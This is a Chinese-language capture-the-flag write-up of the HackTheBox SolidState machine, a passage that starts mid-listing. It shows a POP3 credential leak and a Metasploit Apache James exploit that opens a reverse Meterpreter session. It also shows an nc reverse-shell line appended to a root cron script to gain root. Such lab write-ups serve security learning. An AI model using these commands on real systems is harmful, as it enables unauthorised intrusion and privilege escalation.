forwards all email for 'user' to 'alias'</span><br><span class="line">showalias [username] shows a user's current email alias</span><br><span class="line">unsetalias [user] unsets an alias for 'user'</span><br><span class="line">setforwarding [<span class="string">username</span>][<span class="symbol">emailaddress</span>] forwards a user's email to another email address</span><br><span class="line">showforwarding [username] shows a user's current email forwarding</span><br><span class="line">unsetforwarding [username] removes a forward</span><br><span class="line">user [repositoryname] change to another user repository</span><br><span class="line">shutdown kills the current JVM (convenient when James is run as a daemon)</span><br><span class="line">quit close connection</span><br><span class="line"></span><br><span class="line"><span class="section"># listusers</span></span><br><span class="line"></span><br><span class="line">Existing accounts 6</span><br><span class="line">user: james</span><br><span class="line">user: ../../../../../../../../etc/bash_completion.d</span><br><span class="line">user: thomas</span><br><span class="line">user: john</span><br><span class="line">user: mindy</span><br><span class="line">user: mailadmin</span><br></pre></td></tr></table></figure>

<p>在 4445 端口把上面几个用户的密码改了之后, 登录上 pop3</p>
<h1 id="拿-user-权限"><a href="#拿-user-权限" class="headerlink" title="拿 user 权限"></a>拿 user 权限</h1><h2 id="john-的邮箱"><a href="#john-的邮箱" class="headerlink" title="john 的邮箱"></a>john 的邮箱</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># root@localhost:~/HTB/solidstate# telnet 10.10.10.51 110</span></span><br><span class="line"></span><br><span class="line">Trying 10.10.10.51...</span><br><span class="line">Connected to 10.10.10.51.</span><br><span class="line">Escape character is '^]'.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line"></span><br><span class="line"><span class="section"># user john</span></span><br><span class="line"></span><br><span class="line">+OK</span><br><span class="line"></span><br><span class="line"><span class="section"># pass john</span></span><br><span class="line"></span><br><span class="line">+OK Welcome john</span><br><span class="line"></span><br><span class="line"><span class="section"># list</span></span><br><span class="line"></span><br><span class="line">+OK 1 743</span><br><span class="line">1 743</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="section"># retr 1</span></span><br><span class="line"></span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: <span class="xml"><span class="tag">&lt;<span class="name">mailadmin@localhost</span>&gt;</span></span></span><br><span class="line">Message-ID: <span class="xml"><span class="tag">&lt;<span class="name">9564574.1.1503422198108.JavaMail.root@solidstate</span>&gt;</span></span></span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: john@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">for <span class="xml"><span class="tag">&lt;<span class="name">john@localhost</span>&gt;</span></span>;</span><br><span class="line">Tue, 22 Aug 2017 13:16:20 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: New Hires access</span><br><span class="line">John,</span><br><span class="line"></span><br><span class="line">Can you please restrict mindy's access until she gets read on to the program.</span><br><span class="line">Also make sure that you send her a tempory password to login to her accounts.</span><br><span class="line"></span><br><span class="line">Thank you in advance.</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line"></span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>大意就是发了一个默认密码给一个叫<code>mindy</code>的人</p>
<h2 id="mindy-的邮箱"><a href="#mindy-的邮箱" class="headerlink" title="mindy 的邮箱"></a>mindy 的邮箱</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># telnet 10.10.10.51 110</span></span><br><span class="line"></span><br><span class="line">Trying 10.10.10.51...</span><br><span class="line">Connected to 10.10.10.51.</span><br><span class="line">Escape character is '^]'.</span><br><span class="line">+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready</span><br><span class="line"></span><br><span class="line"><span class="section"># user mindy</span></span><br><span class="line"></span><br><span class="line">+OK</span><br><span class="line"></span><br><span class="line"><span class="section"># pass mindy</span></span><br><span class="line"></span><br><span class="line">+OK Welcome mindy</span><br><span class="line"></span><br><span class="line"><span class="section"># list</span></span><br><span class="line"></span><br><span class="line">+OK 2 1945</span><br><span class="line">1 1109</span><br><span class="line">2 836</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="section"># retr</span></span><br><span class="line"></span><br><span class="line">-ERR Usage: RETR [mail number]</span><br><span class="line"></span><br><span class="line"><span class="section"># retr 1</span></span><br><span class="line"></span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: <span class="xml"><span class="tag">&lt;<span class="name">mailadmin@localhost</span>&gt;</span></span></span><br><span class="line">Message-ID: <span class="xml"><span class="tag">&lt;<span class="name">5420213.0.1503422039826.JavaMail.root@solidstate</span>&gt;</span></span></span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798</span><br><span class="line">for <span class="xml"><span class="tag">&lt;<span class="name">mindy@localhost</span>&gt;</span></span>;</span><br><span class="line">Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Welcome</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line">Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.</span><br><span class="line"></span><br><span class="line">We are looking forward to you joining our team and your success at Solid State Security.</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="section"># retr 2</span></span><br><span class="line"></span><br><span class="line">+OK Message follows</span><br><span class="line">Return-Path: <span class="xml"><span class="tag">&lt;<span class="name">mailadmin@localhost</span>&gt;</span></span></span><br><span class="line">Message-ID: <span class="xml"><span class="tag">&lt;<span class="name">16744123.2.1503422270399.JavaMail.root@solidstate</span>&gt;</span></span></span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=us-ascii</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Delivered-To: mindy@localhost</span><br><span class="line">Received: from 192.168.11.142 ([192.168.11.142])</span><br><span class="line">by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581</span><br><span class="line">for <span class="xml"><span class="tag">&lt;<span class="name">mindy@localhost</span>&gt;</span></span>;</span><br><span class="line">Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)</span><br><span class="line">From: mailadmin@localhost</span><br><span class="line">Subject: Your Access</span><br><span class="line"></span><br><span class="line">Dear Mindy,</span><br><span class="line"></span><br><span class="line">Here are your ssh credentials to access the system. Remember to reset your password after your first login.</span><br><span class="line">Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.</span><br><span class="line"></span><br><span class="line">username: mindy</span><br><span class="line">pass: P@55W0rd1!2@</span><br><span class="line"></span><br><span class="line">Respectfully,</span><br><span class="line">James</span><br></pre></td></tr></table></figure>

<p>整挺好——直接得到 user 权限</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(linux/smtp/apache<span class="emphasis">_james_</span>exec) &gt; handler -H 10.10.16.122 -P 4443 -p linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(linux/smtp/apache<span class="emphasis">_james_</span>exec) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 6.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">msf5 exploit(linux/smtp/apache<span class="emphasis">_james_</span>exec) &gt; [*] Sending stage (989416 bytes) to 10.10.10.51</span><br><span class="line">[*] 10.10.10.51:25 - Command Stager progress - 100.00% done (773/773 bytes)</span><br><span class="line">[*] 10.10.10.51:25 - Waiting for cron to execute payload...</span><br><span class="line">[*] Meterpreter session 3 opened (10.10.16.122:4444 -&gt; 10.10.10.51:42336) at 2020-05-07 20:54:27 +0000</span><br><span class="line">msf5 exploit(linux/smtp/apache<span class="emphasis">_james_</span>exec) &gt; sessions -l</span><br><span class="line"></span><br><span class="line"><span class="section"># Active sessions</span></span><br><span class="line"></span><br><span class="line">Id Name Type Information Connection</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">3 meterpreter x86/linux 10.10.16.122:4444 -&gt; 10.10.10.51:42336 (10.10.10.51)</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/smtp/apache<span class="emphasis">_james_</span>exec) &gt; sessions 3</span><br><span class="line">[*] Starting interaction with 3...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1962 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">whoami</span><br><span class="line">mindy</span><br><span class="line">id</span><br><span class="line">uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)</span><br></pre></td></tr></table></figure>

<h1 id="走歪的路"><a href="#走歪的路" class="headerlink" title="走歪的路"></a>走歪的路</h1><p>ssh 登录上去之后，用 linpeas.sh 做本机信息收集，发现在 631 端口有个 web 服务</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name  </span><br><span class="line">tcp 0 0 0.0.0.0:22 0.0.0.0:_ LISTEN -  </span><br><span class="line">tcp 0 0 127.0.0.1:631 0.0.0.0:_ LISTEN -</span><br></pre></td></tr></table></figure>

<p>curl 看了下，感觉有戏,<code>cups 2.2.1</code></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># curl 127.0.0.1:631</span></span><br><span class="line"></span><br><span class="line">% Total % Received % Xferd Average Speed Time Time Time Current</span><br><span class="line">Dload Upload Total Spent Left Speed</span><br><span class="line">100 2362 <span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span>&gt;</span></span> 0 0 0 --:--:-- --:--:-- --:--:-- 0</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line">...</span><br><span class="line"><span class="code">    &lt;title&gt;Home - CUPS 2.2.1&lt;/title&gt;</span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="code">    &lt;div class="header"&gt;</span></span><br><span class="line"><span class="code">      &lt;ul&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="http://www.cups.org/" target="_blank"&gt;CUPS.org&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a class="active" href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="/admin"&gt;Administration&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="/classes/"&gt;Classes&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="/help/"&gt;Help&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="/jobs/"&gt;Jobs&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">	&lt;li&gt;&lt;a href="/printers/"&gt;Printers&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="code">      &lt;/ul&gt;</span></span><br><span class="line"><span class="code">    &lt;/div&gt;</span></span><br><span class="line"><span class="code">    &lt;div class="body"&gt;</span></span><br><span class="line"><span class="code">      &lt;div class="row"&gt;</span></span><br><span class="line"><span class="code">	&lt;h1&gt;CUPS 2.2.1&lt;/h1&gt;</span></span><br><span class="line"><span class="code">	&lt;p&gt;CUPS is the standards-based, open source printing system developed by &lt;a href="http://www.apple.com/"&gt;Apple Inc.&lt;/a&gt; for macOS&lt;sup&gt;®&lt;/sup&gt; and other UNIX&lt;sup&gt;®&lt;/sup&gt;-like operating systems.&lt;/p&gt;</span></span><br><span class="line"><span class="code">      &lt;/div&gt;</span></span><br><span class="line"><span class="code">      &lt;div class="row"&gt;</span></span><br><span class="line"><span class="code">	&lt;div class="thirds"&gt;</span></span><br><span class="line"><span class="code">	  &lt;h2&gt;CUPS for Users&lt;/h2&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/overview.html"&gt;Overview of CUPS&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/options.html"&gt;Command-Line Printing and Options&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="http://www.cups.org/lists.php?LIST=cups"&gt;User Forum&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	&lt;/div&gt;</span></span><br><span class="line"><span class="code">	&lt;div class="thirds"&gt;</span></span><br><span class="line"><span class="code">	  &lt;h2&gt;CUPS for Administrators&lt;/h2&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="admin"&gt;Adding Printers and Classes&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/policies.html"&gt;Managing Operation Policies&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/network.html"&gt;Using Network Printers&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/man-cupsd.conf.html"&gt;cupsd.conf Reference&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	&lt;/div&gt;</span></span><br><span class="line"><span class="code">	&lt;div class="thirds"&gt;</span></span><br><span class="line"><span class="code">	  &lt;h2&gt;CUPS for Developers&lt;/h2&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/api-overview.html"&gt;Introduction to CUPS Programming&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/api-cups.html"&gt;CUPS API&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/api-filter.html"&gt;Filter and Backend Programming&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="help/api-httpipp.html"&gt;HTTP and IPP APIs&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	  &lt;p&gt;&lt;a href="http://www.cups.org/lists.php?LIST=cups-devel"&gt;Developer Forum&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="code">	&lt;/div&gt;</span></span><br><span class="line"><span class="code">      &lt;/div&gt;</span></span><br><span class="line"><span class="code">    &lt;/div&gt;</span></span><br><span class="line"><span class="code">    &lt;div class="footer"&gt;CUPS and the CUPS logo are trademarks of &lt;a href="http://www.apple.com"&gt;Apple Inc.&lt;/a&gt; Copyright © 2007-2015 Apple Inc. All rights reserved.&lt;/div&gt;</span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"> 100  2362    0     0   531k      0 --:--:-- --:--:-- --:--:--  576k</span><br></pre></td></tr></table></figure>

<p>于是想端口转发到本地来搞, 这里采用知道创宇的<code>rtcp</code></p>
<p>端口转发</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在 A 服务器上运行：</span><br><span class="line">./rtcp.py c:localhost:631 c:10.10.16.122:630</span><br><span class="line"></span><br><span class="line">在 B 服务器上运行：</span><br><span class="line">./rtcp.py l:630 l:631</span><br><span class="line"></span><br><span class="line"><span class="code">    表示在本地监听了 10001 与 10002 两个端口，这样，这两个端口就可以互相传输数据了</span></span><br></pre></td></tr></table></figure>

<p>转发失败，不知道什么原因。。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588926099446-06788da3-a721-4b8f-931a-11b8a777b8eb.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=1008&size=71148&status=done&style=none&width=504" alt="image.png"><br>另一方面，用 msf 自带的提权模块也有一些结果</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/recon/local<span class="emphasis">_exploit_</span>suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 10.10.10.51 - exploit/linux/local/network<span class="emphasis">_manager_</span>vpnc<span class="emphasis">_username_</span>priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.51 - exploit/linux/local/pkexec: The service is running, but could not be validated.</span><br></pre></td></tr></table></figure>

<p>尝试了，全部失败。</p>
<p>查了下 walkthrough，网上的使用的是 nc 直接反弹 shell，将<code>tmp.py</code>的内容改成反弹 shell，等待定时任务执行直接提权。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>刚刚得到的是一个受限的 shell-<code>rbash</code>。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588858957254-4923071a-4a96-4e4a-910a-45d5151f1723.png#align=left&display=inline&height=453&margin=%5Bobject%20Object%5D&name=image.png&originHeight=963&originWidth=1587&size=209705&status=done&style=none&width=746" alt="image.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Users with console</span><br><span class="line">james:x:1000:1000:james:/home/james/:/bin/bash</span><br><span class="line">mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><code>rbash</code>中很多命令都没有，而且不能用<code>/</code>，因此使用 linux/smtp/apache_james_exe 模块来反弹完整的 shell, 启动模块后，登录 mindy 用户的 ssh 即可收到 shell<br>机器信息</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># uname -a</span></span><br><span class="line"></span><br><span class="line">Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux</span><br><span class="line"></span><br><span class="line"><span class="section"># cat /etc/issue</span></span><br><span class="line"></span><br><span class="line">Debian GNU/Linux 9 \n \l</span><br></pre></td></tr></table></figure>

<p>那么拿到 meterpreter 的 shell 之后，看到<code>/opt/tmp.py</code>文件是 root 权限，里面的内容可以加以利用</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#!/usr/bin/env python</span></span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">os.system('rm -r /tmp/\* ')</span><br><span class="line">except:</span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure>

<p>追加一条反弹 shell 的代码</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "os.system('/bin/nc -e /bin/bash 10.10.16.122 99')" &gt;&gt; /opt/tmp.py</span><br></pre></td></tr></table></figure>

<p>等待定时任务启动，nc 监听即可得到 root</p>
<h1 id="反思总结"><a href="#反思总结" class="headerlink" title="反思总结"></a>反思总结</h1><ul>
<li>实际上，当我拿到 root 权限后，我才发现，user 用户下输入<code>crontab -l</code>是无法看到<code>root</code>用户的定时任务的。因此也就无怪乎 linpeas.sh 找到下面这个定时任务了。只能用<code>ps aux</code>配合上<code>ls -al</code>直觉推断一波了</li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; &gt; crontab -l</span></span><br><span class="line"></span><br><span class="line"><span class="section"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># Each task to run has to be defined through a single line</span></span><br><span class="line"></span><br><span class="line"><span class="section"># indicating with different fields when the task will be run</span></span><br><span class="line"></span><br><span class="line"><span class="section"># and what command to run for the task</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># To define the time you can provide concrete values for</span></span><br><span class="line"></span><br><span class="line"><span class="section"># minute (m), hour (h), day of month (dom), month (mon),</span></span><br><span class="line"></span><br><span class="line"><span class="section"># and day of week (dow) or use '\*' in these fields (for 'any').</span></span><br><span class="line"></span><br><span class="line"><span class="section"># Notice that tasks will be started based on the cron's system</span></span><br><span class="line"></span><br><span class="line"><span class="section"># daemon's notion of time and timezones.</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># Output of the crontab jobs (including errors) is sent through</span></span><br><span class="line"></span><br><span class="line"><span class="section"># email to the user the crontab file belongs to (unless redirected).</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"></span><br><span class="line"><span class="section"># at 5 a.m every week with:</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 0 5 \* \* 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"></span><br><span class="line"><span class="section">#</span></span><br><span class="line"></span><br><span class="line"><span class="section"># m h dom mon dow command</span></span><br><span class="line"></span><br><span class="line"><span class="emphasis">_/3 _</span> \<span class="emphasis">* \*</span> \* python /opt/tmp.py</span><br></pre></td></tr></table></figure>

<ul>
<li>一开始，在 tmp.py 里加入了反弹 shel 的代码后，直接执行后发现，反弹的并不是 root 权限。</li>
<li>看来 linux 的权限是“谁运行就是谁的权限”</li>
<li>TRY HARDER</li>
</ul>
<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
<li><a href="https://www.58ssl.com/ftp/1897.html" target="_blank" rel="noopener">SMTP、POP3、NNTP、FTP、HTTP 服务器常用指令 - SSL 之家</a></li>
<li><a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/" target="_blank" rel="noopener">rbash - 一个受限的 Bash Shell 用实际示例说明</a></li>
